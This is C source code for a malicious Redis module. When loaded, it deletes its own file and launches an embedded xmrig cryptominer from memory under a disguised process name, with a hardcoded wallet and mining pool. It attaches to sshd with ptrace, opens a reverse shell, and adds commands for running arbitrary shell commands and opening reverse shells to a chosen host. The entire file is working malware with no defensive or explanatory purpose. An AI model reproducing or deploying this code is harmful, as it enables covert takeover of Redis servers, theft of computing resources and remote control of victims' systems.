#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include "redismodule.h"
#include "miner.c"
#include <dlfcn.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define SHM_NAME ""
#define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html

extern unsigned char xmrig[];
extern unsigned int xmrig_len;

// Detect if kernel is < or => than 3.17
// Ugly as hell, probably I was drunk when I coded it
int kernel_version() {
	struct utsname buffer;
	uname(&buffer);

	char *token;
	char *separator = ".";

	token = strtok(buffer.release, separator);
	if (atoi(token) < 3) {
		return 0;
	}
	else if (atoi(token) > 3){
		return 1;
	}

	token = strtok(NULL, separator);
	if (atoi(token) < 17) {
		return 0;
	}
	else {
		return 1;
	}
}


// Returns a file descriptor where we can write our shared object
int open_ramfs(void) {
	int shm_fd;

	//If we have a kernel < 3.17
	// We need to use the less fancy way
	if (kernel_version() == 0) {
		shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
		if (shm_fd < 0) { //Something went wrong :(
			fprintf(stderr, "[-] Could not open file descriptor\n");
			exit(-1);
		}
	}
	// If we have a kernel >= 3.17
	// We can use the funky style
	else {
		shm_fd = memfd_create(SHM_NAME, 1);
		if (shm_fd < 0) { //Something went wrong :(
			fprintf(stderr, "[- Could not open file descriptor\n");
			exit(-1);
		}
	}
	return shm_fd;
}


// Load the shared object
void load_so(int shm_fd) {
	char path[1024];
	void *handle;

	printf("[+] Trying to load Shared Object!\n");
	if (kernel_version() == 1) { //Funky way
		snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
	} else { // Not funky way :(
		close(shm_fd);
		snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
	}
	handle = dlopen(path, RTLD_LAZY);
	if (!handle) {
		fprintf(stderr,"[-] Dlopen failed with error: %s\n", dlerror());
	}
}

void execute_miner(){
	int fd;
	char path[1024];
    fd = open_ramfs();
	if (write(fd, xmrig, xmrig_len) < 0) {
                fprintf(stderr, "[-] Could not write file :'(\n");
                close(fd);
                exit(-1);
        }
        printf("[+] File written!\n");
	 if (fchmod(fd, S_IRUSR | S_IWUSR | S_IXUSR) == -1) {
        perror("Error changing file permissions");
        return ;
    }
    char *const argv[] = {"/usr/local/sbin/python3.2","-algo","verushash","--donate-level","1","-wallet","34QDLJdagdGa6tuoBUX65xYJo7q7QK3","-rigName","CCMNR","-pool1","verusash.auto.nicehash.com:443","-noLog","true","-protocol","JSON-RPC","-sortPools","true", NULL};
    // Execute the file descriptor using execveat
    snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), fd);
    execve(path, argv, 0);

}

void delete_self() {
    Dl_info dl_info;
    if (dladdr((void*)delete_self, &dl_info)) {
        printf("Path: %s\n", dl_info.dli_fname);

        // Use unlink to delete the file
        if (unlink(dl_info.dli_fname) == 0) {
            printf("Successfully deleted: %s\n", dl_info.dli_fname);
        } else {
            perror("Failed to delete");
        }
    } else {
        printf("Failed to get library path.\n");
    }
}


void reverse_demo() {
    char *ip = "127.0.0.1";
    int port = 1337;
    int s;

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ip);
    sa.sin_port = htons(port);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    char *envp[] = {"HISTFILE=/dev/null", NULL};
    execve("/bin/sh", 0, envp);
}

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 2) {
                size_t cmd_len;
                size_t size = 1024;
                char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

                FILE *fp = popen(cmd, "r");
                char *buf, *output;
                buf = (char *)malloc(size);
                output = (char *)malloc(size);
                while ( fgets(buf, sizeof(buf), fp) != 0 ) {
                        if (strlen(buf) + strlen(output) >= size) {
                                output = realloc(output, size<<2);
                                size <<= 1;
                        }
                        strcat(output, buf);
                }
                RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
                RedisModule_ReplyWithString(ctx, ret);
                pclose(fp);
        } else {
                return RedisModule_WrongArity(ctx);
        }
        return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
	if (argc == 3) {
		size_t cmd_len;
		char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
		char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
		int port = atoi(port_s);
		int s;

		struct sockaddr_in sa;
		sa.sin_family = AF_INET;
		sa.sin_addr.s_addr = inet_addr(ip);
		sa.sin_port = htons(port);
		
		s = socket(AF_INET, SOCK_STREAM, 0);
		connect(s, (struct sockaddr *)&sa, sizeof(sa));
		dup2(s, 0);
		dup2(s, 1);
		dup2(s, 2);

		execve("/bin/sh", 0, 0);
	}
    return REDISMODULE_OK;
}
pid_t find_process_by_name(const char *name) {
    DIR *dir;
    struct dirent *ent;
    char *endptr;
    char buf[512];

    if (!(dir = opendir("/proc"))) {
        perror("can't open /proc");
        return -1;
    }

    while ((ent = readdir(dir)) != NULL) {
        long lpid = strtol(ent->d_name, &endptr, 10);
        if (*endptr != '\0') {
            continue;
        }

        snprintf(buf, sizeof(buf), "/proc/%ld/cmdline", lpid);
        FILE *fp = fopen(buf, "r");
        if (fp) {
            if (fgets(buf, sizeof(buf), fp) != NULL) {
                if (strstr(buf, name) != NULL) {
                    fclose(fp);
                    closedir(dir);
                    return (pid_t)lpid;
                }
            }
            fclose(fp);
        }
    }

    closedir(dir);
    return -1;
}

int hijack_sshd() {


    pid_t pid = find_process_by_name("sshd");
    if (pid == -1) {
        fprintf(stderr, "Process not found\n");
        return 1;
    }

    printf("Attaching to process with PID %ld\n", (long)pid);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace");
	return 1;
    }

    // Wait for the process to stop
    waitpid(pid, NULL, 0);
    unsigned long address = 0x12345678;
    long modified_data = 0x1;
    printf("Detaching from process with PID %ld\n", (long)pid);
    

     if (ptrace(PTRACE_POKEDATA, pid, (void *)address, (void *)modified_data) == -1) {
        perror("ptrace");
    }

    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
        perror("ptrace");
	return 1;
    }

    return 0;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    sleep(1); 
    delete_self();
    sleep(1); 
    pid_t miner_pid = fork();
    if (miner_pid == 0) {
        execute_miner();
    }
    sleep(1);
    hijack_sshd();
    sleep(1); 
    pid_t reverse_pid = fork();
    if (reverse_pid == 0) {
        reverse_demo();
    }

    if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1)
                        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
	  if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
